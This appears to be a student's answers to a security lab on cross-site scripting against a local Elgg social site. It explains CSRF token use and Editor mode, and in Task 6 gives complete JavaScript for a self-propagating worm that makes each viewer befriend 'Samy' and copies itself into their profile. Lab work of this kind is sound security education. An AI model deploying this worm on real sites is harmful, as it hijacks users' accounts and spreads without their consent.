Task 4 (30 Points): Becoming the Victim’s Friend  

These two lines are grabbing Elgg’s security tokens — and they’re absolutely necessary for the attack to work. 

Line1: (__elgg_ts) gets the timestamp token
Line2: (__elgg_token) gets the session token

These tokens are how Elgg protects itself from fake requests. Every time you send a request to do something like add a friend or change a profile, Elgg checks these values to make sure the request is legit and coming from a logged-in user. If you leave these out, the server will think the request is suspicious or invalid, and it’ll block it — even if the rest of the code is perfect. So basically, these lines are how your malicious script "pretends" to be the user. Without them, the attack fails.

No, a successful XSS attack would likely not be possible if only the Editor mode is available. According to the book, “The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not. Since we do not want any extra code added to our attacking code, the Text mode should be enabled before entering the above JavaScript code. This can be done by clicking on "Edit HTML", which can be found at the top right of the "About Me" text field.” This means that Editor mode may automatically escape or alter special characters like <, >, and " - which are required for injecting and executing JavaScript code.






Task 5 (20 Points): Modifying the Victim’s Profile 

This line is there to make sure the attack doesn't run on Samy himself. When the worm is loaded (like from Samy’s own profile), it checks: “Is the person viewing this profile not Samy?” If the current user is not Samy, the worm will run, which is adding Samy as a friend and infecting the profile. But if Samy views his own profile (which he will), this line prevents the worm from accidentally changing his own profile or sending friend requests to himself.


The worm runs no matter who views the profile, even Samy. So, when Samy visits his own profile, the script runs on himself, and: Samy adds himself as a friend, and Samy’s profile is infected with a second copy of the worm.








Task 6(10 Points): Writing a Self-propagating XSS Worm 
Provide the code and screenshot of the successful self-propagating XSS worm. 

Code:
<script id="worm" type="text/javascript">
window.onload = function () {
    // Step 1: Extract CSRF tokens and victim info
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var name = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var samyGuid = elgg.page_owner.guid;

    // Step 2: Create friend request URL to add Samy
    var friendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;

    // Step 3: Grab worm code from the page using DOM
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // Step 4: Build new profile description with worm code injected
    var description = "&description=This profile has been infected by Samy.<br>" + wormCode;

    // Step 5: Create the POST request to modify victim’s profile
    var profileUrl = "http://www.seed-server.com/action/profile/edit";
    var content = token + ts + name + guid + description;

    // Step 6: If not Samy, send both requests
    if (elgg.session.user.guid != samyGuid) {
        // Add Samy as a friend
        var Ajax1 = new XMLHttpRequest();
        Ajax1.open("GET", friendUrl, true);
        Ajax1.send();

        // Infect victim’s profile with worm
        var Ajax2 = new XMLHttpRequest();
        Ajax2.open("POST", profileUrl, true);
        Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax2.send(content);
    }
}
</script>
